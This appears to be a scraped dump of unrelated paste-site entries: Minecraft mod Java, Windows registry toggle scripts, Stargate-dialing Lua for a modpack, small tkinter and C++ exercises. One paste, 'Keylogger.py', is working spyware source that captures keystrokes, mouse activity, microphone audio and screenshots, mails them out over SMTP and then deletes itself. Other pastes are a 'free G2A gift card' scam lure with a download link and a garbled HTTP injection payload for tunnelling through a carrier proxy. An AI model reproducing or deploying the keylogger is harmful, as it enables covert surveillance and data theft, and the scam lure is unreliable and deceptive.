        this.goalSelector.addGoal(3, new SeaOtter.SwimAroundGoal(this, 1.0D, 10));
        this.goalSelector.addGoal(4, new LookAtPlayerGoal(this, Player.class, 6.0F));
        this.goalSelector.addGoal(5, new RandomLookAroundGoal(this));
    }

    public static AttributeSupplier.Builder createAttributes() {
        return Mob.createMobAttributes().add(Attributes.MAX_HEALTH, 16.0F).add(Attributes.MOVEMENT_SPEED, 0.25D);
    }

    public void addAdditionalSaveData(CompoundTag tag) {
        super.addAdditionalSaveData(tag);
        tag.putBoolean(""Floating"", this.isFloating());
        tag.putBoolean(""Swimming"", this.isSwimming());
    }

    public void readAdditionalSaveData(CompoundTag tag) {
        super.readAdditionalSaveData(tag);
        this.setFloating(tag.getBoolean(""Floating""));
        this.setSwimming(tag.getBoolean(""Swimming""));
    }

    public AgeableMob getBreedOffspring(ServerLevel level, AgeableMob mob) {
        return MysticEntities.SEA_OTTER.get().create(level);
    }

    public MobType getMobType() {
        return MobType.WATER;
    }

    // TICKS & A.I.

    public void tick() {
        super.tick();

        if (this.level().isClientSide) {
            this.idleAnimationState.animateWhen(this.isFloating(), this.tickCount);
        }
    }

    public void aiStep() {
        super.aiStep();
        ++this.ticksSinceSearchedForFood;

        if (this.cooldownBeforeFindingFoodAgain > 0) {
            --this.cooldownBeforeFindingFoodAgain;
        }

        if (this.isFloating()) {
            this.setDeltaMovement(this.getDeltaMovement().multiply(1.0D, 0.0D, 1.0D));
            this.setYya(0.0F);
        }

        if (this.isUnderWater() && (this.getAirSupply() < 200 || this.random.nextFloat() <= 0.001F)) {
            this.setNeedsToSurface(true);
        }
    }

    // NAVIGATION & MOVEMENT

    protected PathNavigation createNavigation(Level level) {
        return new SeaOtter.SeaOtterPathNavigation(this, level);
    }

    public void travel(Vec3 vec3) {
        if (this.isEffectiveAi() && this.isInWater()) {
            this.moveRelative(this.getSpeed(), vec3);
            this.move(MoverType.SELF, this.getDeltaMovement());
            this.setDeltaMovement(this.getDeltaMovement().scale(0.9D));
        } else {
            super.travel(vec3);
        }
    }

    public int getMaxAirSupply() {
        return 6000;
    }

    public boolean isFloating() {
        return this.entityData.get(DATA_FLOATING_ID);
    }

    public void setFloating(boolean value) {
        this.entityData.set(DATA_FLOATING_ID, value);
        this.entityData.set(DATA_SWIMMING_ID, !value);
    }

    public boolean isSwimming() {
        return this.entityData.get(DATA_SWIMMING_ID);
    }

    public void setSwimming(boolean value) {
        this.entityData.set(DATA_SWIMMING_ID, value);
        this.entityData.set(DATA_FLOATING_ID, !value);
    }

    public boolean wantsToSearchForFood() {
        return this.ticksSinceSearchedForFood > 200;
    }

    /**
     * @return when they need to breath above water, to eat, or to sleep.
     */
    public boolean needsToSurface() {
        return this.needsToSurface;
    }

    public void setNeedsToSurface(boolean needsToSurface) {
        this.needsToSurface = needsToSurface;
    }

    @Override
    public InteractionResult mobInteract(Player player, InteractionHand hand) {
        boolean flag = player.getItemInHand(hand).is(Items.STICK);
        this.setFloating(flag);
        this.setSwimming(!flag);
        return super.mobInteract(player, hand);
    }

    // TODO: GOALS

    class FloatAtSurfaceGoal extends Goal {

        public boolean canUse() {
            return !SeaOtter.this.isSwimming() || !SeaOtter.this.wantsToSearchForFood();
        }

        public void start() {
            SeaOtter.this.setFloating(true);
        }
    }

    class SwimToSurfaceGoal extends MoveToBlockGoal {

        SwimToSurfaceGoal(PathfinderMob mob, double speed, int range) {
            super(mob, speed, range);
            this.setFlags(EnumSet.of(Flag.MOVE, Flag.LOOK));
        }

        public boolean canUse() {
            return super.canUse() && SeaOtter.this.needsToSurface() && !SeaOtter.this.isFloating() && !SeaOtter.this.onGround();
        }

        public void stop() {
            SeaOtter.this.setNeedsToSurface(false);
            SeaOtter.this.getNavigation().stop();
        }

        protected boolean isValidTarget(LevelReader reader, BlockPos pos) {
            return reader.getBlockState(pos.above()).isAir();
        }
    }

    class SwimAroundGoal extends RandomSwimmingGoal {

        SwimAroundGoal(PathfinderMob mob, double speed, int interval) {
            super(mob, speed, interval);
        }

        public boolean canUse() {
            return super.canUse() && !SeaOtter.this.isFloating();
        }

        public boolean canContinueToUse() {
            return super.canContinueToUse() && !SeaOtter.this.isFloating();
        }

        public void start() {
            super.start();
            SeaOtter.this.setSwimming(true);
        }
    }

    class SearchForFoodGoal extends Goal {
        int ticks;

        public boolean canUse() {
            return SeaOtter.this.wantsToSearchForFood() && SeaOtter.this.cooldownBeforeFindingFoodAgain <= 0;
        }

        public boolean canContinueToUse() {
            return !this.hasSearchedLongEnough();
        }

        public void start() {
            this.ticks = 0;
            SeaOtter.this.setSwimming(true);
        }

        public void stop() {
            if (this.hasSearchedLongEnough()) {
                SeaOtter.this.cooldownBeforeFindingFoodAgain = 200;
                SeaOtter.this.setFloating(true);
            }

            this.ticks = 0;
        }

        private boolean hasSearchedLongEnough() {
            return this.ticks > 200;
        }

        public void tick() {
            ++this.ticks;
        }
    }

    // TODO: NAVIGATION & CONTROLS

    class SeaOtterMoveControl extends MoveControl {

        public SeaOtterMoveControl(Mob mob) {
            super(mob);
        }

        @Override
        public void tick() {
            if (SeaOtter.this.isInWater()) {
                SeaOtter.this.setDeltaMovement(SeaOtter.this.getDeltaMovement().add(SeaOtter.this.getLookAngle().scale(SeaOtter.this.isFloating() ? 0.002F : 0.005F)));

                if (!SeaOtter.this.isFloating()) {
                    if (this.operation == Operation.MOVE_TO && !this.mob.getNavigation().isDone()) {
                        double d0 = this.wantedX - this.mob.getX();
                        double d1 = this.wantedY - this.mob.getY();
                        double d2 = this.wantedZ - this.mob.getZ();
                        double distanceSqr = d0 * d0 + d1 * d1 + d2 * d2;

                        if (distanceSqr < (double) 2.5000003E-7F) {
                            this.mob.setZza(0.0F);
                        } else {
                            float yRot = (float) (Mth.atan2(d2, d0) * (double) (180F / (float) Math.PI)) - 90.0F;
                            this.mob.setYRot(this.rotlerp(this.mob.getYRot(), yRot, 40.0F));
                            this.mob.yBodyRot = this.mob.getYRot();
                            this.mob.yHeadRot = this.mob.getYRot();
                            float speed = (float) (this.speedModifier * this.mob.getAttributeValue(Attributes.MOVEMENT_SPEED));
                            this.mob.setSpeed(speed * 0.2F);

                            double horizontalDistance = Math.sqrt(d0 * d0 + d2 * d2);
                            if (Math.abs(d1) > (double) 1.0E-5F || Math.abs(horizontalDistance) > (double) 1.0E-5F) {
                                float xRot = -((float) (Mth.atan2(d1, horizontalDistance) * (double) (180F / (float) Math.PI)));
                                xRot = Mth.clamp(Mth.wrapDegrees(xRot), -180.0F, 180.0F);
                                this.mob.setXRot(this.rotlerp(this.mob.getXRot(), xRot, 45.0F));
                            }

                            BlockPos wantedPos = new BlockPos((int) this.wantedX, (int) this.wantedY, (int) this.wantedZ);
                            BlockState wantedBlockState = this.mob.level().getBlockState(wantedPos);

                            if (d1 > (double) this.mob.maxUpStep() && d0 * d0 + d2 * d2 < 4.0F && d1 <= 1.0D && wantedBlockState.getFluidState().isEmpty()) {
                                this.mob.getJumpControl().jump();
                                this.mob.setSpeed(speed);
                            }

                            float f0 = Mth.cos(this.mob.getXRot() * ((float) Math.PI / 180F));
                            float f1 = Mth.sin(this.mob.getXRot() * ((float) Math.PI / 180F));
                            this.mob.zza = f0 * speed;
                            this.mob.yya = -f1 * (speed);
                        }
                    } else {
                        this.mob.setSpeed(0.0F);
                        this.mob.setXxa(0.0F);
                        this.mob.setYya(0.0F);
                        this.mob.setZza(0.0F);
                    }
                }
            } else {
                super.tick();
            }
        }
    }

    static class SeaOtterPathNavigation extends WaterBoundPathNavigation {

        public SeaOtterPathNavigation(Mob mob, Level level) {
            super(mob, level);
        }

        protected PathFinder createPathFinder(int nodes) {
            this.nodeEvaluator = new SwimNodeEvaluator(true);
            return new PathFinder(this.nodeEvaluator, nodes);
        }

        protected boolean canUpdatePath() {
            return true;
        }
    }

}"
hKVnJ59R,🔥 G2A.com Free Gift Card Guide Apr 2024 NEW🔥,jordanthebordan,GetText,Tuesday 23rd of April 2024 05:06:06 PM CDT,"G2А.com frеe gift cаrd & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to dаte versiоn of this scriрt. Any оther one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1J2K7N8g5mZ_Zp-S0cjQrax7KrPk97EG3/view?usp=sharing
 
Working as of:
24 Аpril 2024"
4cybhFxy,disable_all_visibility_options,Python253,Bash,Tuesday 23rd of April 2024 04:03:56 PM CDT,"#!/bin/bash

# Disable hidden files
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v Hidden /t REG_DWORD /d 0 /f > /dev/null

# Disable file extensions
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v HideFileExt /t REG_DWORD /d 0 /f > /dev/null

# Disable super hidden files
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v ShowSuperHidden /t REG_DWORD /d 0 /f > /dev/null

echo ""Visibility Options Disabled:\nHidden files, file extensions, and super hidden files are now Disabled.""


"
Je4M15Wq,enable_all_visibility_options,Python253,Bash,Tuesday 23rd of April 2024 04:02:55 PM CDT,"#!/bin/bash

# Enable hidden files
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v Hidden /t REG_DWORD /d 1 /f > /dev/null

# Enable file extensions
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v HideFileExt /t REG_DWORD /d 1 /f > /dev/null

# Enable super hidden files
reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v ShowSuperHidden /t REG_DWORD /d 1 /f > /dev/null

echo ""Visibility Options Enabled:\nHidden files, file extensions, and super hidden files are now enabled.""

"
XqM4ZfhY,org mode hacking,mark-naylor-1701,Lisp,Tuesday 23rd of April 2024 04:02:31 PM CDT,";; org-mode kludges
;; This mode apparently remaps forward-sentence and backward-sentence, but only
;; for interactive. These wrappers will allow for key bindings to commands that
;; work as expected.

(defun wrap-forward-sentence (&optional prefix)
  (interactive ""p"")
  (forward-sentence prefix))

(defun wrap-backward-sentence (&optional prefix)
  (interactive ""p"")
  (backward-sentence prefix))



(define-key org-mode-map (kbd ""C-c s f"") #'wrap-forward-sentence)
(define-key org-mode-map (kbd ""C-c s b"") #'wrap-backward-sentence)
"
u5fzg9xd,file_visibility_options,Python253,Python,Tuesday 23rd of April 2024 03:51:35 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: file_visibility_options.py
# Version: 1.00
# Author: Jeoi Reqi

""""""
This script allows users to toggle visibility settings related to files and file extensions in Windows by modifying registry values. It provides options to enable or disable hidden files, file extensions, and super hidden files. The script verifies the registry path before presenting the options menu.

Requirements:
- Python 3.x
- Windows operating system

Functions:
- set_registry_value(key, value_name, value_data): Sets a registry value.
- main(): Main function to display the options menu and handle user input.

Usage:
1. Run the script in a Python environment.
2. Follow the on-screen instructions to enable or disable file visibility settings.
3. Type '0' to exit the script.

Additional Notes:
- This script modifies the Windows registry. Exercise caution when using it.
- Always verify the changes made by the script in the registry editor.
""""""

import subprocess


def set_registry_value(key, value_name, value_data):
    """"""
    Set a registry value.

    Args:
        key (str): Registry key path.
        value_name (str): Name of the registry value.
        value_data (int): Data to set for the registry value.

    Returns:
        None
    """"""
    subprocess.run(
        [
            ""reg"",
            ""add"",
            key,
            ""/t"",
            ""REG_DWORD"",
            ""/v"",
            value_name,
            ""/d"",
            str(value_data),
            ""/f"",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def main():
    """"""
    Display the options menu and handle user input.

    Returns:
        None
    """"""
    while True:
        print(
            ""-------------------------------------------------------------------------------\n""
            ""::VERIFY PATH::\n""
            ""[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced]\n""
            ""-------------------------------------------------------------------------------\n""
        )
        print(""\tChoose an option:\n"")
        print(""\t1. Enable Hidden Files"")
        print(""\t2. Disable Hidden Files"")
        print(""\t3. Enable File Extensions"")
        print(""\t4. Disable File Extensions"")
        print(""\t5. Enable Super Hidden Files"")
        print(""\t6. Disable Super Hidden Files\n"")
        choice = input(""\tEnter your choice (Or type '0' to exit): "")

        if choice == ""0"":
            print(""\n\tExiting...\tGoodBye!\n"")
            break
        elif choice == ""1"":
            set_registry_value(
                ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
                ""Hidden"",
                1,
            )
            print(""\n\n\t- Hidden Files Enabled!\n"")
        elif choice == ""2"":
            set_registry_value(
                ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
                ""Hidden"",
                0,
            )
            print(""\n\n\t- Hidden Files Disabled!\n"")
        elif choice == ""3"":
            set_registry_value(
                ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
                ""HideFileExt"",
                0,
            )
            print(""\n\n\t- File Extensions Enabled!\n"")
        elif choice == ""4"":
            set_registry_value(
                ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
                ""HideFileExt"",
                1,
            )
            print(""\n\n\t- File Extensions Disabled!\n"")
        elif choice == ""5"":
            set_registry_value(
                ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
                ""ShowSuperHidden"",
                1,
            )
            print(""\n\n\t- Super Hidden Files Enabled!\n"")
        elif choice == ""6"":
            set_registry_value(
                ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
                ""ShowSuperHidden"",
                0,
            )
            print(""\n\n\t- Super Hidden Files Disabled!\n"")
        else:
            print(""\n\n\t! Invalid choice !\n"")


if __name__ == ""__main__"":
    main()
"
X6nEnPB4,toggle_dev_mode,Python253,Python,Tuesday 23rd of April 2024 03:19:33 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: toggle_dev_mode.py
# Version: 1.00
# Author: Jeoi Reqi

""""""
This script modifies the Windows registry to toggle Developer Mode on or off.
It checks if the registry key exists and creates it if not.
Then, it prompts the user to enable or disable Developer Mode & modifies the registry accordingly.
Error messages are displayed if any issues arise.

Requirements:
- Python 3.x
- Windows 10+

Functions:
- check_registry_key(key_path) : Checks if the specified registry key exists.
- create_registry_key(key_path): Creates the specified registry key.
- toggle_developer_mode(enable): Toggles Developer Mode on or off by setting a registry value.

Usage:
1. Run the script using Python 3.x.
2. Follow the on-screen prompts to enable or disable Developer Mode.
3. Verify the registry for the changes.

Additional Notes:
- This script modifies the Windows registry, but should not require administrator privileges.
- Use caution when modifying the registry, as incorrect changes can cause system instability.
- Compatible with Windows 10+ operating systems.
""""""

import winreg


def check_registry_key(key_path):
    """"""
    Check if the registry key exists.

    Args:
        key_path (str): The path of the registry key to check.

    Returns:
        bool: True if the registry key exists, False otherwise.
    """"""
    try:
        winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ)
        return True
    except FileNotFoundError:
        return False


def create_registry_key(key_path):
    """"""
    Create a registry key.

    Args:
        key_path (str): The path of the registry key to create.

    Returns:
        None

    Raises:
        Exception: If an error occurs while creating the registry key.
    """"""
    try:
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
    except Exception as e:
        raise Exception(f""Error creating registry key: {e}"")


def toggle_developer_mode(enable):
    """"""
    Toggle Developer Mode on or off by setting a registry value.

    Args:
        enable (bool): True to enable Developer Mode, False to disable.

    Returns:
        None

    Raises:
        FileNotFoundError: If the registry key is not found.
        Exception: If an error occurs while setting the registry value or creating the registry key.
    """"""
    key_path = r""SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock""
    value_name = ""AllowDevelopmentWithoutDevLicense""

    # Check if the registry key exists, create it if it doesn't
    if not check_registry_key(key_path):
        create_registry_key(key_path)

    # Open the registry key
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
    except FileNotFoundError:
        raise FileNotFoundError(""Error: Could not find the registry key."")

    # Set the DWORD value
    try:
        value_data = 1 if enable else 0
        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
        print(f""\nDeveloper Mode {'Enabled' if enable else 'Disabled'}.\n"")
    except Exception as e:
        raise Exception(f""Error setting registry value: {e}"")
    finally:
        winreg.CloseKey(key)


if __name__ == ""__main__"":
    while True:
        choice = input(
            """"""
-----------------------------------------------------------------------------
::VERIFY PATH::
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock]
-----------------------------------------------------------------------------

\t\t::OPTIONS::

\t\t1: Enable Developer Mode
\t\t0: Disable Developer Mode

\t\tMake Your Selection (1 or 0): 
""""""
        )
        if choice in (""1"", ""0""):
            toggle_developer_mode(int(choice))
            break
        else:
            print(""\nInvalid choice. Please enter either 1 or 0.\n"")
"
9TvW36SU,Direct Dial Test,PerryExtra,Lua,Tuesday 23rd of April 2024 03:06:24 PM CDT,"INTERFACE_TYPES = {
    ""basic_interface"",
    ""crystal_interface"",
    ""advanced_crystal_interface""
};
STARGATE_TYPES = {
    ""sgjourney:classic_stargate"",
    ""sgjourney:milky_way_stargate"",
    ""sgjourney:pegasus_stargate"",
    ""sgjourney:universe_stargate"",
    ""sgjourney:tollan_stargate""
};

--Find the proper interface & get stargate type--
INTERFACE_TYPE = INTERFACE_TYPES[1];
INTERFACE = peripheral.find(INTERFACE_TYPE);
if INTERFACE == null then
    print(""\"""" .. INTERFACE_TYPES[1] .. ""\"" was not found attempting to find another"");
    INTERFACE_TYPE = INTERFACE_TYPES[2];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    print(""\"""" .. INTERFACE_TYPES[2] .. ""\"" was not found attempting to find another"");
    INTERFACE_TYPE = INTERFACE_TYPES[3];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    print(""\"""" .. INTERFACE_TYPES[3] .. ""\"" was not found no other to be found"");
    error(""No interfaces were found"", 0);
end
STARGATE_TYPE = INTERFACE.getStargateType();

print(""Interface Type : "" .. INTERFACE_TYPE);
print(""Stargate Type : "" .. STARGATE_TYPE);
print(""\n"");

if INTERFACE.isStargateConnected() then
    INTERFACE.disconnectStargate();
end

os.sleep(1);

INTERFACE.engageSymbol(26);
os.sleep(0.25);
INTERFACE.engageSymbol(6);
os.sleep(0.25);
INTERFACE.engageSymbol(14);
os.sleep(0.25);
INTERFACE.engageSymbol(31);
os.sleep(0.25);
INTERFACE.engageSymbol(11);
os.sleep(0.25);
INTERFACE.engageSymbol(29);
os.sleep(0.25);
INTERFACE.engageSymbol(0);"
mXr2u9WQ,proximity door.lua,ZathegamE,Lua,Tuesday 23rd of April 2024 02:06:01 PM CDT,"localdetector = peripheral.find(""environmentDetector"") 
entities = localdetector.scanEntities(2.5)
while true do
entities = localdetector.scanEntities(2.5)
if entities ~= nil 
then print(#entities)
    if #entities >= 1 then
    redstone.setOutput(""back"",true)
    else
    rs.setOutput(""back"",false)
end
end
sleep(0.5)

end
"
F71m5GnX,Untitled,sissou123,PHP,Tuesday 23rd of April 2024 02:02:17 PM CDT,"Create a PHP Login and Registration System From Scratch 2020
The FULLEST and complete Login and Registration System course using PHP, MySQL and Ajax.. from scratch!
What you will learn
Create a full user login, logout and registration system.
Code a secure login system from scratch
Create members-only pages on your website.
for more :https://cuty.io/3KKwUNb
"
xhUgPm3P,Untitled,zikoman,C++,Tuesday 23rd of April 2024 01:51:41 PM CDT,G�E�T� �/� �H�T�T�P�/�1�.�1�\�n�H�o�s�t�:� �[�r�o�t�a�t�e�=�c�o�r�e�g�a�t�e�w�a�y�.�a�p�p�.�d�l�i�g�h�t�.�c�o�m�:�8�0�;�a�p�i�.�p�a�y�j�o�y�.�c�o�m�:�8�0�;�A�p�i�.�b�e�t�s�a�f�e�.�c�o�.�k�e�:�8�0�;�a�s�s�e�t�s�.�f�u�z�u�.�c�o�m�:�8�0�;�A�p�i�.�b�e�t�i�k�a�.�c�o�m�:�8�0�;�k�a�p�u�a�f�r�i�c�a�.�c�o�m�:�8�0�;�5�2�.�8�4�.�1�0�2�.�7�8�:�8�0�;�c�s�l�o�b�b�y�-�c�d�n�.�s�e�r�v�i�s�s�o�n�.�c�o�m�:�8�0�]�\�n�\�n�[�s�p�l�i�t�]�U�N�L�O�C�K� �/�?� �H�T�T�P�/�1�.�1�\�n�H�o�s�t�:� �f�r�e�e�1�2�.�s�s�h�t�p�r�o�j�e�c�t�.�c�o�m�\�r�\�n�U�p�g�r�a�d�e�:� �W�e�b�s�o�c�k�e�t�\�r�\�n�\�r�\�n
Gm8p8HHM,Keylogger.py,Dynamic_Fantasy,Python,Tuesday 23rd of April 2024 11:56:45 AM CDT,"try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = [""pyscreenshot"",""sounddevice"",""pynput""]
    call(""pip install "" + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = ""YOUR_USERNAME""
    EMAIL_PASSWORD = ""YOUR_PASSWORD""
    SEND_REPORT_EVERY = 60 # as in seconds
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = ""KeyLogger Started...""
            self.email = email
            self.password = password
        def appendlog(self, string):
            self.log = self.log + string
        def on_move(self, x, y):
            current_move = logging.info(""Mouse moved to {} {}"".format(x, y))
            self.appendlog(current_move)
        def on_click(self, x, y):
            current_click = logging.info(""Mouse moved to {} {}"".format(x, y))
            self.appendlog(current_click)
        def on_scroll(self, x, y):
            current_scroll = logging.info(""Mouse moved to {} {}"".format(x, y))
            self.appendlog(current_scroll)
        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = ""SPACE""
                elif key == key.esc:
                    current_key = ""ESC""
                else:
                    current_key = "" "" + str(key) + "" ""
            self.appendlog(current_key)
        def send_mail(self, email, password, message):
            sender = ""Private Person <from@example.com>""
            receiver = ""A Test User <to@example.com>""
            m = f""""""\
            Subject: main Mailtrap
            To: {receiver}
            From: {sender}
            \n""""""
            m += message
            with smtplib.SMTP(""smtp.mailtrap.io"", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, message)
        def report(self):
            self.send_mail(self.email, self.password, ""\n\n"" + self.log)
            self.log = """"
            timer = threading.Timer(self.interval, self.report)
            timer.start()
        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)
        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            if os.name == ""nt"":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system(""cd "" + pwd)
                    os.system(""TASKKILL /F /IM "" + os.path.basename(__file__))
                    print('File was closed.')
                    os.system(""DEL "" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')
            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system(""cd "" + pwd)
                    os.system('pkill leafpad')
                    os.system(""chattr -i "" +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system(""rm -rf"" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()"
8PUVb1uR,Combobox,plarmi,Python,Tuesday 23rd of April 2024 11:52:30 AM CDT,"import tkinter as tk
from tkinter import ttk

def change_color(event):
    # Получаем значение, которое выбрал пользователь
    selected_color = color_combobox.get()
    canvas.config(bg=selected_color)

# Создание главного окна
root = tk.Tk()
root.title(""Изменение цвета холста"")

# Создание выпадающего списка с цветами
colors = [""red"", ""green"", ""blue"", ""yellow"", ""violet""]
color_combobox = ttk.Combobox(root, values=colors, state=""readonly"")
color_combobox.set(""red"")
# Если было нажатие и сделан выбор, то будет меняться цвет
color_combobox.bind(""<<ComboboxSelected>>"", change_color)
color_combobox.pack(pady=20)

# Создание холста
canvas = tk.Canvas(root, width=200, height=200, bg=""red"")
canvas.pack(pady=20)

# Запуск главного цикла
root.mainloop()"
sq13Adjs,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 11:41:10 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <ctime>
#include <cctype>

using namespace std;

class Shape {
    public:
        virtual double getArea() = 0;
};
class Square : public Shape {
    private:
        double a;
    public:
        Square(double a){
            this->a = a;
        }
        virtual double getArea(){
            return a*a;
        }
};
class Circle : public Shape {
    private:
        double r;
    public:
        Circle(double r){
            this->r = r;
        }
        virtual double getArea(){
            return 3.14159265358979323846*r*r;
        }
};

void doSomething(Shape &r){
    cout << ""We will compute the area"" << endl;
    cout << ""The area is "" << r.getArea() << endl;
}


int main(){

    cout << ""Let's compute area."" << endl;

    Shape *s = NULL;

    cout << ""1 for square, 0 for circle?"" << endl;
    int x;
    cin >> x;

    if(x == 1){
        cout << ""Great. Please enter edge length: "" << endl;
        double edge;
        cin >> edge;
        s = new Square(edge);
    } else if(x == 0){
        cout << ""Great. Please enter radius length: "" << endl;
        double radius;
        cin >> radius;
        s = new Circle(radius);
    }

    if(s != NULL){
        doSomething(*s);
        delete s;
    }

    cout << ""Good bye"" << endl;
    return 0;
}
"
rnHvfXHz,StargateDialing,PerryExtra,Lua,Tuesday 23rd of April 2024 11:41:07 AM CDT,"ADDRESSES = {
    {""Abydos"", {26, 6, 14, 31, 11, 29, 0}},
    {""Chulak"", {8, 1, 22, 14, 36, 19, 0}},
    {""Cavum Tenebrae"", {18, 7, 3, 36, 25, 15, 0}},
    {""Lantea"", {18, 20, 1, 15, 14, 7, 19, 0}},
    {""Overworld"", {27, 25, 4, 35, 10, 28, 0}},
    {""Nether"", {27, 23, 4, 34, 12, 28, 0}},
    {""End"", {13, 24, 2, 19, 3, 30, 0}},
    {""Aether"", {8, 7, 2, 17, 6, 21, 0}},
    {""Twilight Forest"", {36, 33, 16, 25, 7, 14, 0}},
    {""Lost City"", {13, 4, 27, 8, 19, 3, 0}},
    {""Glacio"", {26, 20, 4, 36, 9, 27, 0}},
    {""ATM Mining"", {25, 33, 20, 7, 37, 17, 0}},
    {""ATM Other"", {12, 23, 36, 13, 21, 16, 0}},
    {""ATM Beyond"", {27, 5, 2, 23, 17, 38, 0}},
    {""Alfeim"", {4, 9, 13, 11, 20, 7, 0}},
    {""Everbright"", {24, 23, 37, 26, 35, 12, 0}},
    {""Everdawn"", {5, 7, 10, 16, 26, 21, 0}},
    {""Otherside"", {4, 13, 27, 12, 24, 17, 0}},
    {""Undergarden"", {2, 4, 6, 31, 21, 35, 0}},
    {""Voidscape"", {26, 5, 4, 11, 2, 37, 0}}
};
INTERFACE_TYPES = {
    ""basic_Interface"",
    ""crystal_Interface"",
    ""advanced_crystal_Interface""
};
STARGATE_TYPES = {
    ""sgjourney:classic_stargate"",
    ""sgjourney:milky_way_stargate"",
    ""sgjourney:pegasus_stargate"",
    ""sgjourney:universe_stargate"",
    ""sgjourney:tollan_stargate""
};

function ClearScreen()
    term.clear();
    term.setCursorPos(1, 1);
end
ClearScreen();

--Function argument calls--
local arg = {...};
IsFastDial = false;
for _,v in pairs(arg) do
    if v == ""--fast"" then
        IsFastDial = true;
    elseif v then
        error(""Bad flag ["" .. v .. ""] failed to initialise"", 0);
    end
end

--Find the proper Interface--
InterfaceType = INTERFACE_TYPES[1];
Interface = peripheral.find(InterfaceType);
if Interface == nil then
    print(""\"""" .. INTERFACE_TYPES[1] .. ""\"" was not found attempting to find another"");
    InterfaceType = INTERFACE_TYPES[2];
    Interface = peripheral.find(InterfaceType);
elseif Interface == nil then
    print(""\"""" .. INTERFACE_TYPES[2] .. ""\"" was not found attempting to find another"");
    InterfaceType = INTERFACE_TYPES[3];
    Interface = peripheral.find(InterfaceType);
elseif Interface == nil then
    print(""\"""" .. INTERFACE_TYPES[3] .. ""\"" was not found attempting to find another"");
    error(""No Interfaces were found"", 0);
end

print(""\"""" .. InterfaceType .. ""\"" was found"");
StargateType = Interface.getStargateType();

print(""Interface Type : "" .. InterfaceType);
print(""Stargate Type : "" .. StargateType);
print(""\"""");

--Check if selected stargate and flags can be used by current Interface--
if (IsFastDial == true or StargateType ~= STARGATE_TYPES[2]) and InterfaceType == INTERFACE_TYPES[1] then
